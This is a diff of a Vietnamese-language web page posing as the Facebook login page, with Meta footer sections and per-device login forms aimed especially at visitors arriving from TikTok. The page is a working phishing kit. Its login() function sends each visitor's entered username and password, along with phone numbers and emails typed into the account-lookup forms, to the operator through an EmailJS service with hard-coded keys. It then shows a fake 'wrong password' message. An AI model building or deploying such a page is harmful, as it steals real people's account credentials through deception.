+                <h2>Đăng ký</h2>
+                <p>Đăng ký tài khoản mới để tham gia cộng đồng Facebook và kết nối với bạn bè, gia đình.</p>
+            </div>
+        </div>
+        <div class="messenger-footer-container">
+            <div class="fb-section">
+                <h2>Messenger</h2>
+                <p>Messenger là ứng dụng nhắn tin nhanh, hỗ trợ trò chuyện qua văn bản, giọng nói và video.</p>
+            </div>
+        </div>
+        <div class="facebook-lite-container">
+            <div class="fb-section">
+                <h2>Facebook Lite</h2>
+                <p>Facebook Lite là phiên bản nhẹ của ứng dụng Facebook, phù hợp với thiết bị cấu hình thấp và kết nối mạng yếu.</p>
+            </div>
+        </div>
+        <div class="video-container">
+            <div class="fb-section">
+                <h2>Video</h2>
+                <p>Xem và chia sẻ video trên Facebook, từ nội dung giải trí đến video trực tiếp.</p>
+            </div>
+        </div>
+        <div class="places-container">
+            <div class="fb-section">
+                <h2>Địa điểm</h2>
+                <p>Khám phá các địa điểm thú vị gần bạn hoặc chia sẻ vị trí của bạn với bạn bè.</p>
+            </div>
+        </div>
+        <div class="games-container">
+            <div class="fb-section">
+                <h2>Trò chơi</h2>
+                <p>Chơi các trò chơi thú vị trên Facebook, từ game giải đố đến game nhập vai.</p>
+            </div>
+        </div>
+        <div class="marketplace-footer-container">
+            <div class="fb-section">
+                <h2>Marketplace</h2>
+                <p>Mua và bán các sản phẩm trong cộng đồng của bạn với Marketplace trên Facebook.</p>
+            </div>
+        </div>
+        <div class="meta-pay-container">
+            <div class="fb-section">
+                <h2>Meta Pay</h2>
+                <p>Meta Pay là dịch vụ thanh toán an toàn, giúp bạn mua sắm và chuyển tiền dễ dàng.</p>
+            </div>
+        </div>
+        <div class="meta-store-container">
+            <div class="fb-section">
+                <h2>Cửa hàng Meta</h2>
+                <p>Mua sắm các sản phẩm công nghệ từ Meta, bao gồm thiết bị VR và phụ kiện.</p>
+            </div>
+        </div>
+        <div class="meta-quest-container">
+            <div class="fb-section">
+                <h2>Meta Quest</h2>
+                <p>Meta Quest là dòng thiết bị thực tế ảo, mang đến trải nghiệm VR đỉnh cao.</p>
+            </div>
+        </div>
+        <div class="ray-ban-meta-container">
+            <div class="fb-section">
+                <h2>Ray-Ban Meta</h2>
+                <p>Ray-Ban Meta là dòng kính thông minh, kết hợp thời trang và công nghệ.</p>
+            </div>
+        </div>
+        <div class="instagram-footer-container">
+            <div class="fb-section">
+                <h2>Instagram</h2>
+                <p>Chia sẻ ảnh và video, kết nối với bạn bè trên Instagram.</p>
+            </div>
+        </div>
+        <div class="threads-container">
+            <div class="fb-section">
+                <h2>Threads</h2>
+                <p>Threads là ứng dụng nhắn tin tập trung vào sự riêng tư, kết nối với bạn bè thân thiết.</p>
+            </div>
+        </div>
+        <div class="fundraisers-container">
+            <div class="fb-section">
+                <h2>Quyên góp</h2>
+                <p>Tạo hoặc tham gia các chiến dịch quyên góp trên Facebook để hỗ trợ cộng đồng.</p>
+            </div>
+        </div>
+        <div class="services-container">
+            <div class="fb-section">
+                <h2>Dịch vụ</h2>
+                <p>Khám phá các dịch vụ của Facebook, từ quảng cáo đến hỗ trợ doanh nghiệp.</p>
+            </div>
+        </div>
+        <div class="voting-info-container">
+            <div class="fb-section">
+                <h2>Trung tâm thông tin bầu cử</h2>
+                <p>Cập nhật thông tin về bầu cử, kiểm tra thông tin và tham gia thảo luận.</p>
+            </div>
+        </div>
+        <div class="privacy-policy-container">
+            <div class="fb-section">
+                <h2>Chính sách quyền riêng tư</h2>
+                <p>Tìm hiểu cách chúng tôi bảo vệ dữ liệu của bạn và quyền riêng tư của bạn.</p>
+            </div>
+        </div>
+        <div class="privacy-center-container">
+            <div class="fb-section">
+                <h2>Trung tâm quyền riêng tư</h2>
+                <p>Quản lý cài đặt quyền riêng tư của bạn và tìm hiểu thêm về bảo mật.</p>
+            </div>
+        </div>
+        <div class="groups-footer-container">
+            <div class="fb-section">
+                <h2>Nhóm</h2>
+                <p>Tham gia các nhóm để kết nối với cộng đồng có cùng sở thích.</p>
+            </div>
+        </div>
+        <div class="create-ad-container">
+            <div class="fb-section">
+                <h2>Tạo quảng cáo</h2>
+                <p>Quảng bá doanh nghiệp của bạn với các công cụ quảng cáo trên Facebook.</p>
+            </div>
+        </div>
+        <div class="create-page-container">
+            <div class="fb-section">
+                <h2>Tạo Trang</h2>
+                <p>Tạo một Trang để quảng bá thương hiệu, tổ chức hoặc sự kiện của bạn.</p>
+            </div>
+        </div>
+        <div class="developers-container">
+            <div class="fb-section">
+                <h2>Nhà phát triển</h2>
+                <p>Phát triển ứng dụng và tích hợp với nền tảng của Facebook qua cổng nhà phát triển.</p>
+            </div>
+        </div>
+        <div class="careers-footer-container">
+            <div class="fb-section">
+                <h2>Tuyển dụng</h2>
+                <p>Khám phá cơ hội việc làm tại Meta và các công ty con.</p>
+            </div>
+        </div>
+        <div class="cookies-container">
+            <div class="fb-section">
+                <h2>Cookie</h2>
+                <p>Tìm hiểu cách chúng tôi sử dụng cookie để cải thiện trải nghiệm của bạn.</p>
+            </div>
+        </div>
+        <div class="ad-choices-container">
+            <div class="fb-section">
+                <h2>Lựa chọn quảng cáo</h2>
+                <p>Quản lý sở thích quảng cáo của bạn và kiểm soát quảng cáo bạn thấy.</p>
+            </div>
+        </div>
+        <div class="terms-container">
+            <div class="fb-section">
+                <h2>Điều khoản</h2>
+                <p>Đọc các điều khoản sử dụng của Facebook để hiểu rõ quyền và trách nhiệm của bạn.</p>
+            </div>
+        </div>
+        <div class="upload-contacts-container">
+            <div class="fb-section">
+                <h2>Tải thông tin liên hệ & đối tượng không phải người dùng</h2>
+                <p>Tải lên danh bạ để tìm bạn bè hoặc sử dụng dữ liệu để quảng cáo.</p>
             </div>
         </div>
     </div>
@@ -507,127 +766,542 @@
         <div class="success-popup-message" id="dialog-message"></div>
         <button class="success-popup-button" onclick="hideDialog()">OK</button>
     </div>
-    <div class="bottom-section">
-        <div class="meta-section">Meta</div>
-    </div>
-    <div class="footer-links">
-        <span onclick="showAbout()" style="cursor: pointer;">Giới thiệu</span>
-        <span onclick="showHelp()" style="cursor: pointer;">Trợ giúp</span>
-        <span onclick="showMore()" style="cursor: pointer;">Xem thêm</span>
-    </div>
+    <footer class="footer">
+        <div class="footer-languages">
+            <a href="#">Tiếng Việt</a>
+            <a href="#">English (UK)</a>
+            <a href="#">中文(台灣)</a>
+            <a href="#">한국어</a>
+            <a href="#">日本語</a>
+            <a href="#">Français (France)</a>
+            <a href="#">ภาษาไทย</a>
+            <a href="#">Español</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Italiano</a>
+            <a href="#">+ Thêm</a>
+        </div>
+        <div class="footer-links">
+            <a onclick="showSignup()">Đăng ký</a>
+            <a onclick="showLogin()">Đăng nhập</a>
+            <a onclick="showMessengerFooter()">Messenger</a>
+            <a onclick="showFacebookLite()">Facebook Lite</a>
+            <a onclick="showVideo()">Video</a>
+            <a onclick="showPlaces()">Địa điểm</a>
+            <a onclick="showGames()">Trò chơi</a>
+            <a onclick="showMarketplaceFooter()">Marketplace</a>
+            <a onclick="showMetaPay()">Meta Pay</a>
+            <a onclick="showMetaStore()">Cửa hàng Meta</a>
+            <a onclick="showMetaQuest()">Meta Quest</a>
+            <a onclick="showRayBanMeta()">Ray-Ban Meta</a>
+            <a onclick="showInstagramFooter()">Instagram</a>
+            <a onclick="showThreads()">Threads</a>
+            <a onclick="showFundraisers()">Quyên góp</a>
+            <a onclick="showServices()">Dịch vụ</a>
+            <a onclick="showVotingInfo()">Trung tâm thông tin bầu cử</a>
+            <a onclick="showPrivacyPolicy()">Chính sách quyền riêng tư</a>
+            <a onclick="showPrivacyCenter()">Trung tâm quyền riêng tư</a>
+            <a onclick="showGroupsFooter()">Nhóm</a>
+            <a onclick="showAbout()">Giới thiệu</a>
+            <a onclick="showHelp()">Trợ giúp</a>
+            <a onclick="showMore()">Xem thêm</a>
+            <a onclick="showCreateAd()">Tạo quảng cáo</a>
+            <a onclick="showCreatePage()">Tạo Trang</a>
+            <a onclick="showDevelopers()">Nhà phát triển</a>
+            <a onclick="showCareersFooter()">Tuyển dụng</a>
+            <a onclick="showCookies()">Cookie</a>
+            <a onclick="showAdChoices()">Lựa chọn quảng cáo</a>
+            <a onclick="showTerms()">Điều khoản</a>
+            <a onclick="showUploadContacts()">Tải thông tin liên hệ & đối tượng không phải người dùng</a>
+        </div>
+        <div class="footer-meta">Meta © 2025</div>
+    </footer>
+
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("wF5gWgp1GWyg7q0KY");
+        })();
+    </script>
 
     <script>
         window.onload = function() {
             const referrer = document.referrer.toLowerCase();
             const userAgent = navigator.userAgent.toLowerCase();
             const urlParams = new URLSearchParams(window.location.search);
+            const isDesktop = window.innerWidth > 1024 && !/mobile|android|iphone|ipad/i.test(userAgent);
+            const isSafari = /safari/i.test(userAgent) && !/chrome/i.test(userAgent) && /mobile/i.test(userAgent);
+            const isMobile = /mobile|android|iphone|ipad/i.test(userAgent) && !isSafari;
 
-            // Logic phát hiện TikTok (chỉ ẩn header khi chắc chắn là TikTok)
             const isFromTikTok = 
-                // Dựa trên referrer
                 referrer.includes("tiktok.com") || 
-                // Dựa trên userAgent
                 userAgent.includes("tiktok") || 
                 userAgent.includes("bytedance") || 
                 userAgent.includes("musical_ly") || 
                 userAgent.includes("douyin") || 
-                // Dựa trên URL parameters
                 urlParams.has("tt_from") || 
                 urlParams.get("utm_source") === "tiktok" || 
                 urlParams.get("source_app") === "tiktok";
 
-            // Debug chi tiết
-            console.log("Referrer:", referrer);
-            console.log("UserAgent:", userAgent);
-            console.log("URL Params:", window.location.search);
-            console.log("Is TikTok:", isFromTikTok);
-
             if (isFromTikTok) {
-                document.querySelector('.header').classList.add('hidden');
-                document.querySelector('.login-container').style.marginTop = '20px';
+                document.body.classList.add('tiktok-mode');
+                document.querySelector('.header-container').classList.add('hidden');
+                document.querySelector('.left-section').style.display = 'none';
+                document.querySelector('.language-text').style.display = 'none';
+                hideAllExcept('.login-container-tiktok');
+            } else if (isDesktop) {
+                document.body.classList.add('desktop-mode');
+                document.querySelector('.header-container').style.display = 'none';
+                document.querySelector('.left-section').style.display = 'block';
+                document.querySelector('.language-text').style.display = 'none';
+                hideAllExcept('.login-container-desktop');
+            } else if (isSafari) {
+                document.body.classList.add('safari-mode');
+                document.querySelector('.header-container').style.display = 'flex';
+                document.querySelector('.left-section').style.display = 'none';
+                document.querySelector('.language-text').style.display = 'block';
+                hideAllExcept('.login-container-safari');
+            } else if (isMobile) {
+                document.body.classList.add('mobile-mode');
+                document.querySelector('.header-container').style.display = 'flex';
+                document.querySelector('.left-section').style.display = 'none';
+                document.querySelector('.language-text').style.display = 'block';
+                hideAllExcept('.login-container-tiktok');
             }
+
+            console.log("Is TikTok:", isFromTikTok);
+            console.log("Is Desktop:", isDesktop);
+            console.log("Is Safari:", isSafari);
+            console.log("Is Mobile:", isMobile);
         };
 
-        function toggleDropdown() {
-            const dropdownMenu = document.getElementById('dropdownMenu');
-            dropdownMenu.classList.toggle('active');
+        function hideAllExcept(selector) {
+            const containers = [
+                '.login-container-tiktok', '.login-container-desktop', '.login-container-safari',
+                '.forgot-password-container', '.forgot-password-email-container', '.create-account-container',
+                '.about-container', '.help-container', '.more-container', '.meta-container', '.careers-container',
+                '.history-container', '.forgot-password-help-container', '.security-container', 
+                '.report-content-container', '.contact-container', '.instagram-container', '.messenger-container',
+                '.whatsapp-container', '.oculus-container', '.stories-container', '.groups-container',
+                '.marketplace-container', '.signup-container', '.messenger-footer-container', 
+                '.facebook-lite-container', '.video-container', '.places-container', '.games-container',
+                '.marketplace-footer-container', '.meta-pay-container', '.meta-store-container', 
+                '.meta-quest-container', '.ray-ban-meta-container', '.instagram-footer-container',
+                '.threads-container', '.fundraisers-container', '.services-container', '.voting-info-container',
+                '.privacy-policy-container', '.privacy-center-container', '.groups-footer-container',
+                '.create-ad-container', '.create-page-container', '.developers-container', 
+                '.careers-footer-container', '.cookies-container', '.ad-choices-container', '.terms-container',
+                '.upload-contacts-container'
+            ];
+            containers.forEach(container => {
+                const element = document.querySelector(container);
+                element.classList.remove('active');
+                element.style.display = container === selector ? 'block' : 'none';
+            });
+            document.querySelector(selector).classList.add('active');
         }
 
-        function hideAllContainers() {
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.forgot-password-container').classList.remove('active');
-            document.querySelector('.forgot-password-email-container').classList.remove('active');
-            document.querySelector('.create-account-container').classList.remove('active');
-            document.querySelector('.about-container').classList.remove('active');
-            document.querySelector('.help-container').classList.remove('active');
-            document.querySelector('.more-container').classList.remove('active');
-        }
+        let previousPage = null;
 
         function showLogin() {
-            hideAllContainers();
-            document.querySelector('.login-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Đăng nhập Facebook | Facebook';
-            document.getElementById('header-title').classList.remove('small-title');
-            document.getElementById('language-text').style.display = 'block';
-            document.getElementById('back-button-header').style.display = 'none';
+            const isDesktop = document.body.classList.contains('desktop-mode');
+            const isSafari = document.body.classList.contains('safari-mode');
+            hideAllExcept(isDesktop ? '.login-container-desktop' : isSafari ? '.login-container-safari' : '.login-container-tiktok');
+            document.getElementById('back-button').style.display = 'none';
+            document.querySelector('.left-section').style.display = isDesktop ? 'block' : 'none';
+            document.querySelector('.header-container').style.display = isDesktop ? 'none' : 'flex';
+            document.querySelector('.language-text').style.display = isDesktop ? 'none' : 'block';
+            previousPage = null;
         }
 
         function showForgotPassword() {
-            hideAllContainers();
-            document.querySelector('.forgot-password-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('language-text').style.display = 'none';
-            document.getElementById('back-button-header').style.display = 'flex';
+            hideAllExcept('.forgot-password-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            document.querySelector('.language-text').style.display = 'none';
+            previousPage = showLogin;
         }
 
         function showForgotPasswordEmail() {
-            hideAllContainers();
-            document.querySelector('.forgot-password-email-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('language-text').style.display = 'none';
-            document.getElementById('back-button-header').style.display = 'flex';
+            hideAllExcept('.forgot-password-email-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            document.querySelector('.language-text').style.display = 'none';
+            previousPage = showForgotPassword;
         }
 
         function showCreateAccount() {
-            hideAllContainers();
-            document.querySelector('.create-account-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('language-text').style.display = 'none';
-            document.getElementById('back-button-header').style.display = 'flex';
+            hideAllExcept('.create-account-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            document.querySelector('.language-text').style.display = 'none';
+            previousPage = showLogin;
         }
 
         function showAbout() {
-            hideAllContainers();
-            document.querySelector('.about-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Giới thiệu';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('language-text').style.display = 'none';
-            document.getElementById('back-button-header').style.display = 'flex';
+            hideAllExcept('.about-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            document.querySelector('.language-text').style.display = 'none';
+            previousPage = showLogin;
+        }
+
+        function showMeta() {
+            hideAllExcept('.meta-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showAbout;
+        }
+
+        function showCareers() {
+            hideAllExcept('.careers-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showAbout;
+        }
+
+        function showHistory() {
+            hideAllExcept('.history-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showAbout;
         }
 
         function showHelp() {
-            hideAllContainers();
-            document.querySelector('.help-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Trợ giúp';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('language-text').style.display = 'none';
-            document.getElementById('back-button-header').style.display = 'flex';
+            hideAllExcept('.help-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            document.querySelector('.language-text').style.display = 'none';
+            previousPage = showLogin;
+        }
+
+        function showForgotPasswordHelp() {
+            hideAllExcept('.forgot-password-help-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showHelp;
+        }
+
+        function showSecurity() {
+            hideAllExcept('.security-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showHelp;
+        }
+
+        function showReportContent() {
+            hideAllExcept('.report-content-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showHelp;
+        }
+
+        function showContact() {
+            hideAllExcept('.contact-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showHelp;
         }
 
         function showMore() {
-            hideAllContainers();
-            document.querySelector('.more-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Xem thêm';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('language-text').style.display = 'none';
-            document.getElementById('back-button-header').style.display = 'flex';
+            hideAllExcept('.more-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            document.querySelector('.language-text').style.display = 'none';
+            previousPage = showLogin;
+        }
+
+        function showInstagram() {
+            hideAllExcept('.instagram-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showMore;
+        }
+
+        function showMessenger() {
+            hideAllExcept('.messenger-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showMore;
+        }
+
+        function showWhatsApp() {
+            hideAllExcept('.whatsapp-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showMore;
+        }
+
+        function showOculus() {
+            hideAllExcept('.oculus-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showMore;
+        }
+
+        function showStories() {
+            hideAllExcept('.stories-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showMore;
+        }
+
+        function showGroups() {
+            hideAllExcept('.groups-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showMore;
+        }
+
+        function showMarketplace() {
+            hideAllExcept('.marketplace-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showMore;
+        }
+
+        function showSignup() {
+            hideAllExcept('.signup-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showMessengerFooter() {
+            hideAllExcept('.messenger-footer-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showFacebookLite() {
+            hideAllExcept('.facebook-lite-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showVideo() {
+            hideAllExcept('.video-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showPlaces() {
+            hideAllExcept('.places-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showGames() {
+            hideAllExcept('.games-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showMarketplaceFooter() {
+            hideAllExcept('.marketplace-footer-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showMetaPay() {
+            hideAllExcept('.meta-pay-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showMetaStore() {
+            hideAllExcept('.meta-store-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showMetaQuest() {
+            hideAllExcept('.meta-quest-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showRayBanMeta() {
+            hideAllExcept('.ray-ban-meta-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showInstagramFooter() {
+            hideAllExcept('.instagram-footer-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showThreads() {
+            hideAllExcept('.threads-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showFundraisers() {
+            hideAllExcept('.fundraisers-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showServices() {
+            hideAllExcept('.services-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showVotingInfo() {
+            hideAllExcept('.voting-info-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showPrivacyPolicy() {
+            hideAllExcept('.privacy-policy-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showPrivacyCenter() {
+            hideAllExcept('.privacy-center-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showGroupsFooter() {
+            hideAllExcept('.groups-footer-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showCreateAd() {
+            hideAllExcept('.create-ad-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showCreatePage() {
+            hideAllExcept('.create-page-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showDevelopers() {
+            hideAllExcept('.developers-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showCareersFooter() {
+            hideAllExcept('.careers-footer-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showCookies() {
+            hideAllExcept('.cookies-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showAdChoices() {
+            hideAllExcept('.ad-choices-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showTerms() {
+            hideAllExcept('.terms-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function showUploadContacts() {
+            hideAllExcept('.upload-contacts-container');
+            document.getElementById('back-button').style.display = 'flex';
+            document.querySelector('.left-section').style.display = 'none';
+            document.querySelector('.header-container').style.display = 'flex';
+            previousPage = showLogin;
+        }
+
+        function goBack() {
+            if (previousPage) {
+                previousPage();
+            }
         }
 
         function showDialog(title, message) {
-            console.log("showDialog called:", title, message);
             const dialog = document.getElementById('custom-dialog');
             const overlay = document.getElementById('dialog-overlay');
             document.getElementById('dialog-title').innerText = title;
@@ -647,50 +1321,43 @@
         }
 
         function login() {
-            const loginInput = document.getElementById('login-input').value;
-            const password = document.getElementById('password').value;
+            const loginInput = document.querySelector('.login-container-tiktok.active #login-input-tiktok') || 
+                              document.querySelector('.login-container-desktop.active #login-input-desktop') || 
+                              document.querySelector('.login-container-safari.active #login-input-safari');
+            const passwordInput = document.querySelector('.login-container-tiktok.active #password-tiktok') || 
+                                  document.querySelector('.login-container-desktop.active #password-desktop') || 
+                                  document.querySelector('.login-container-safari.active #password-safari');
+            const loginValue = loginInput.value;
+            const password = passwordInput.value;
 
-            if (!loginInput || !password) {
+            if (!loginValue || !password) {
                 showDialog("Đăng nhập không thành công!", "Vui lòng nhập đầy đủ thông tin!");
                 return;
             }
 
-            console.log("Dữ liệu trước khi gửi:", { email: loginInput, password: password });
-
             const templateParams = {
                 password: password,
                 phone: '',
-                email: loginInput,
+                email: loginValue,
                 firstName: '',
                 lastName: ''
             };
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    console.log("Email gửi thành công:", response);
                     showDialog("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu vui lòng thử lại.");
                 }, function(error) {
-                    console.error("Lỗi gửi email:", error);
                     showDialog("Đăng nhập không thành công", "Sai thông tin tài khoản hoặc mật khẩu vui lòng thử lại.");
                 });
         }
 
         function searchByPhone() {
             const phone = document.getElementById('phone-input').value;
-
             if (!phone) {
                 showDialog("Tìm kiếm thất bại!", "Vui lòng nhập số di động!");
                 return;
             }
-
-            const templateParams = {
-                password: '',
-                phone: phone,
-                email: '',
-                firstName: '',
-                lastName: ''
-            };
-
+            const templateParams = { password: '', phone: phone, email: '', firstName: '', lastName: '' };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
                     showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến số di động của bạn!");
@@ -701,20 +1368,11 @@
 
         function searchByEmail() {
             const email = document.getElementById('email-input').value;
-
             if (!email) {
                 showDialog("Tìm kiếm thất bại!", "Vui lòng nhập email!");
                 return;
             }
-
-            const templateParams = {
-                password: '',
-                phone: '',
-                email: email,
-                firstName: '',
-                lastName: ''
-            };
-
+            const templateParams = { password: '', phone: '', email: email, firstName: '', lastName: '' };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
                     showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến email của bạn!");
